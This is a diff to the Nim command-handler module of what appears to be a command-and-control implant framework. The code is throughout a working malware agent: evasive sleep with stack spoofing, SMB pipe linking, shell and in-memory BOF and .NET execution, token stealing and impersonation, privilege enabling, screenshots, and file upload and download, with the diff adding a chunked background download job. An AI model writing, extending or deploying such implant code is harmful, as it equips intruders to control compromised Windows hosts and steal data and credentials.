@@ -4,7 +4,7 @@ import ../../../common/[serialize, utils]
 import ../../../types/[common, agent, protocol]
 import ../utils/io
 import ../protocol/result
-import ./exit
+import ./[exit, job]
 import ./transport/smb
 
 const MODULES* {.intdefine.} = 0
@@ -15,7 +15,7 @@ var commands* = newTable[CommandType, proc(ctx: AgentCtx, task: Task): TaskResul
 for cmd in low(CommandType) .. high(CommandType): 
     commands[cmd] = proc (ctx: AgentCtx, task: Task): TaskResult =
         let command = cast[CommandType](task.command)
-        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(protect("Command \"") & $command & protect("\" not enabled.")))
+        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(protect("Command \"") & $command & protect("\" not enabled.")))
 
 #[
     Built-in modules (always enabled)
@@ -32,7 +32,7 @@ commands[CMD_EXIT] = proc(ctx: AgentCtx, task: Task): TaskResult =
         exit(exitType)
 
     except CatchableError as err:
-        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
         
 commands[CMD_SELF_DESTRUCT] = proc(ctx: AgentCtx, task: Task): TaskResult =
     try: 
@@ -40,7 +40,7 @@ commands[CMD_SELF_DESTRUCT] = proc(ctx: AgentCtx, task: Task): TaskResult =
         exit(EXIT_PROCESS, true)
 
     except CatchableError as err:
-        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
         
 commands[CMD_SLEEP] = proc(ctx: AgentCtx, task: Task): TaskResult = 
     try: 
@@ -50,10 +50,10 @@ commands[CMD_SLEEP] = proc(ctx: AgentCtx, task: Task): TaskResult =
         ctx.sleepSettings.sleepDelay = delay
 
         let response = fmt"Sleep settings: Technique: {$ctx.sleepSettings.sleepTechnique}, Delay: {$ctx.sleepSettings.sleepDelay}ms, Jitter: {$ctx.sleepSettings.jitter}%, Stack spoofing: {$ctx.sleepSettings.spoofStack}"
-        return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
+        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
 
     except CatchableError as err: 
-        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 commands[CMD_JITTER] = proc(ctx: AgentCtx, task: Task): TaskResult = 
     try:
@@ -66,10 +66,10 @@ commands[CMD_JITTER] = proc(ctx: AgentCtx, task: Task): TaskResult =
         ctx.sleepSettings.jitter = jitter 
 
         let response = fmt"Sleep settings: Technique: {$ctx.sleepSettings.sleepTechnique}, Delay: {$ctx.sleepSettings.sleepDelay}ms, Jitter: {$ctx.sleepSettings.jitter}%, Stack spoofing: {$ctx.sleepSettings.spoofStack}"
-        return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
+        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
     
     except CatchableError as err: 
-        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 commands[CMD_SLEEPMASK] = proc(ctx: AgentCtx, task: Task): TaskResult = 
     try: 
@@ -85,10 +85,10 @@ commands[CMD_SLEEPMASK] = proc(ctx: AgentCtx, task: Task): TaskResult =
             ctx.sleepSettings.spoofStack = spoofStack
 
         let response = fmt"Sleep settings: Technique: {$ctx.sleepSettings.sleepTechnique}, Delay: {$ctx.sleepSettings.sleepDelay}ms, Jitter: {$ctx.sleepSettings.jitter}%, Stack spoofing: {$ctx.sleepSettings.spoofStack}"
-        return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
+        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(response))
 
     except CatchableError as err: 
-        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 commands[CMD_LINK] = proc(ctx: AgentCtx, task: Task): TaskResult = 
     try: 
@@ -99,10 +99,10 @@ commands[CMD_LINK] = proc(ctx: AgentCtx, task: Task): TaskResult =
 
         # Link agent
         let data = ctx.link("\\\\" & host & "\\pipe\\" & pipe)
-        return createTaskResult(task, STATUS_COMPLETED, RESULT_LINK, data)
+        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, data)
 
     except CatchableError as err:
-        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
     
 commands[CMD_UNLINK] = proc(ctx: AgentCtx, task: Task): TaskResult = 
     try: 
@@ -112,11 +112,41 @@ commands[CMD_UNLINK] = proc(ctx: AgentCtx, task: Task): TaskResult =
 
         # Unlink agent
         ctx.unlink(agentId)
-        return createTaskResult(task, STATUS_COMPLETED, RESULT_UNLINK, string.toBytes(agentId))
+        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, string.toBytes(agentId))
 
     except CatchableError as err:
-        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
-    
+        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+
+commands[CMD_JOBS] = proc(ctx: AgentCtx, task: Task): TaskResult =
+    try:
+        print "   [>] Listing jobs."
+        
+        var packer = Packer.init()
+        packer.add(cast[uint32](ctx.jobs.len()))
+        for job in ctx.jobs:
+            packer.add(job.task.taskId)
+            packer.add(job.task.command)
+            packer.add(job.task.timestamp)
+
+        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, packer.pack())
+
+    except CatchableError as err:
+        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+
+commands[CMD_CANCEL] = proc(ctx: AgentCtx, task: Task): TaskResult =
+    try:
+        print fmt"   [>] Cancelling job."
+
+        let jobId = Bytes.toString(task.args[0].data)
+        
+        if not ctx.cancelJob(string.toUuid(jobId)):
+            raise newException(CatchableError, protect("Job not found: ") & jobId)
+
+        return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(protect("Job ") & jobId & protect(" cancelled.")))
+
+    except CatchableError as err:
+        return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+
 #[
     Optional modules (can be enabled during payload generation)
     - shell execution
@@ -144,12 +174,12 @@ when ((MODULES and cast[uint32](MODULE_SHELL)) == cast[uint32](MODULE_SHELL)):
             let (output, status) = execCmdEx(fmt("{command} {arguments}")) 
 
             if output != "":
-                return createTaskResult(task, cast[StatusType](status), RESULT_STRING, string.toBytes(output))
+                return ctx.createTaskResult(task, cast[StatusType](status), RESULT_STRING, string.toBytes(output))
             else: 
-                return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
+                return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 when ((MODULES and cast[uint32](MODULE_BOF)) == cast[uint32](MODULE_BOF)):
     import ../utils/coff 
@@ -169,12 +199,12 @@ when ((MODULES and cast[uint32](MODULE_BOF)) == cast[uint32](MODULE_BOF)):
             let output = inlineExecuteGetOutput(string.toBytes(objectFileContents), arguments)
 
             if output != "":
-                return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
+                return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
             else: 
-                return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
+                return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 when ((MODULES and cast[uint32](MODULE_DOTNET)) == cast[uint32](MODULE_DOTNET)):
     import ../utils/clr 
@@ -211,37 +241,59 @@ when ((MODULES and cast[uint32](MODULE_DOTNET)) == cast[uint32](MODULE_DOTNET)):
             let (assemblyInfo, output) = dotnetInlineExecuteGetOutput(string.toBytes(assemblyBytes), arguments)
             
             if output != "":
-                return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(assemblyInfo & "\n" & output))
+                return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(assemblyInfo & "\n" & output))
             else: 
-                return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
+                return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
                 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 when ((MODULES and cast[uint32](MODULE_FILETRANSFER)) == cast[uint32](MODULE_FILETRANSFER)):
-    import os 
+    import os
+
+    const DOWNLOAD_CHUNK_SIZE* = 512 * 1024
+
+    proc downloadProc(hWrite: HANDLE, task: Task) {.nimcall, gcsafe.} =
+        let filePath = absolutePath(Bytes.toString(task.args[0].data))
+        
+        let hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
+        if hFile == INVALID_HANDLE_VALUE:
+            return
+        defer: CloseHandle(hFile)
+
+        var buf: array[DOWNLOAD_CHUNK_SIZE, byte]
+        while true:
+            var bytesRead: DWORD
+            if ReadFile(hFile, addr buf[0], DOWNLOAD_CHUNK_SIZE, 
+                addr bytesRead, nil) == FALSE or bytesRead == 0:
+                break
+            var written: DWORD
+            if WriteFile(hWrite, addr buf[0], bytesRead, 
+                addr written, nil) == FALSE:
+                break
 
     commands[CMD_DOWNLOAD] = proc(ctx: AgentCtx, task: Task): TaskResult = 
-        try: 
-            var filePath: string = absolutePath(Bytes.toString(task.args[0].data)) 
+            try: 
+                let filePath = absolutePath(Bytes.toString(task.args[0].data)) 
+                print fmt"   [>] Downloading {filePath}"
 
-            print fmt"   [>] Downloading {filePath}"
+                if not fileExists(filePath):
+                    raise newException(CatchableError, protect("File not found: ") & filePath)
 
-            # Read file contents into memory and return them as the result 
-            var fileBytes = readFile(filePath)
+                let totalSize = getFileSize(filePath)
 
-            # Create result packet for file download            
-            var packer = Packer.init() 
+                if not ctx.startJob(task, downloadProc):
+                    raise newException(CatchableError, GetLastError().getError())
 
-            packer.addDataWithLengthPrefix(string.toBytes(filePath))
-            packer.addDataWithLengthPrefix(string.toBytes(fileBytes))
+                var packer = Packer.init() 
+                packer.addDataWithLengthPrefix(string.toBytes(filePath))
+                packer.add(cast[uint64](totalSize))
 
-            let data = packer.pack() 
+                # Return STATUS_STARTED packet with filename and total size
+                return ctx.createTaskResult(task, STATUS_STARTED, RESULT_BINARY, packer.pack())
 
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, data)
-
-        except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            except CatchableError as err: 
+                return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))    
 
     commands[CMD_UPLOAD] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
@@ -260,10 +312,10 @@ when ((MODULES and cast[uint32](MODULE_FILETRANSFER)) == cast[uint32](MODULE_FIL
             # Write the file to the specified destination
             writeFile(destination, fileContents)
 
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"File uploaded to {destination}."))
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"File uploaded to {destination}."))
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 when ((MODULES and cast[uint32](MODULE_SCREENSHOT)) == cast[uint32](MODULE_SCREENSHOT)):
     import times
@@ -284,10 +336,10 @@ when ((MODULES and cast[uint32](MODULE_SCREENSHOT)) == cast[uint32](MODULE_SCREE
 
             let data = packer.pack() 
 
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, data)
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, data)
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 when ((MODULES and cast[uint32](MODULE_PROCESS)) == cast[uint32](MODULE_PROCESS)):
     import ../utils/process
@@ -309,10 +361,10 @@ when ((MODULES and cast[uint32](MODULE_PROCESS)) == cast[uint32](MODULE_PROCESS)
                     .addDataWithLengthPrefix(string.toBytes(procInfo.user))     # [Process user]: Variable
                     .add(cast[uint32](procInfo.session))                        # [Session]: 4 bytes
 
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_PROCESSES, packer.pack())
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, packer.pack())
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 when ((MODULES and cast[uint32](MODULE_TOKEN)) == cast[uint32](MODULE_TOKEN)):
     import ../utils/token
@@ -337,10 +389,10 @@ when ((MODULES and cast[uint32](MODULE_TOKEN)) == cast[uint32](MODULE_TOKEN)):
             else:
                 impersonationUser = username
                 
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {impersonationUser}."))
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {impersonationUser}."))
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
     commands[CMD_STEAL_TOKEN] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
@@ -349,46 +401,46 @@ when ((MODULES and cast[uint32](MODULE_TOKEN)) == cast[uint32](MODULE_TOKEN)):
             let pid = int(Bytes.toUint32(task.args[0].data))       
             let username  = stealToken(pid)
 
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {username}."))
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(fmt"Impersonated {username}."))
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
     commands[CMD_REV2SELF] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
             print fmt"   [>] Reverting access token."
             rev2self()
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
         
     commands[CMD_TOKEN_INFO] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
             print fmt"   [>] Retrieving token information."
             let tokenInfo = getCurrentToken().getTokenInfo() 
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(tokenInfo))
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(tokenInfo))
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
     commands[CMD_ENABLE_PRIV] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
             print fmt"   [>] Enabling token privilege."
             let privilege = Bytes.toString(task.args[0].data)            
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(enablePrivilege(privilege)))
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(enablePrivilege(privilege)))
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
     commands[CMD_DISABLE_PRIV] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
             print fmt"   [>] Disabling token privilege."
             let privilege = Bytes.toString(task.args[0].data)            
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(enablePrivilege(privilege, false)))
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(enablePrivilege(privilege, false)))
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
 when ((MODULES and cast[uint32](MODULE_FILESYSTEM)) == cast[uint32](MODULE_FILESYSTEM)):
     import algorithm
@@ -406,10 +458,10 @@ when ((MODULES and cast[uint32](MODULE_FILESYSTEM)) == cast[uint32](MODULE_FILES
                 raise newException(CatchableError, GetLastError().getError())
 
             let output = $buffer[0 ..< (int)length]
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
     commands[CMD_CD] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
@@ -421,10 +473,10 @@ when ((MODULES and cast[uint32](MODULE_FILESYSTEM)) == cast[uint32](MODULE_FILES
             if SetCurrentDirectoryW(targetDirectory) == FALSE:         
                 raise newException(CatchableError, GetLastError().getError())
 
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, string.toBytes(targetDirectory))
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, string.toBytes(targetDirectory))
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
     commands[CMD_RM] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
@@ -435,10 +487,10 @@ when ((MODULES and cast[uint32](MODULE_FILESYSTEM)) == cast[uint32](MODULE_FILES
             if DeleteFile(target) == FALSE:         
                 raise newException(CatchableError, GetLastError().getError())
 
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
         
     commands[CMD_RMDIR] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
@@ -449,10 +501,10 @@ when ((MODULES and cast[uint32](MODULE_FILESYSTEM)) == cast[uint32](MODULE_FILES
             if RemoveDirectoryA(target) == FALSE:         
                 raise newException(CatchableError, GetLastError().getError())
 
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
     commands[CMD_MOVE] = proc(ctx: AgentCtx, task: Task): TaskResult = 
         try: 
@@ -465,10 +517,10 @@ when ((MODULES and cast[uint32](MODULE_FILESYSTEM)) == cast[uint32](MODULE_FILES
             if MoveFile(lpExistingFileName, lpNewFileName) == FALSE:         
                 raise newException(CatchableError, GetLastError().getError())
 
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
     commands[CMD_COPY] = proc(ctx: AgentCtx, task: Task): TaskResult = 
 
@@ -483,10 +535,10 @@ when ((MODULES and cast[uint32](MODULE_FILESYSTEM)) == cast[uint32](MODULE_FILES
             if CopyFile(lpExistingFileName, lpNewFileName, FALSE) == FALSE:         
                 raise newException(CatchableError, GetLastError().getError())
 
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
     
     # FILETIME is 100-nanosecond intervals since January 1, 1601
@@ -593,7 +645,7 @@ when ((MODULES and cast[uint32](MODULE_FILESYSTEM)) == cast[uint32](MODULE_FILES
                     .add(entry.size)
                     .add(entry.lastWriteTime)
             
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_DIRECTORY_LISTING, packer.pack())
+            return ctx.createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, packer.pack())
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
+            return ctx.createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
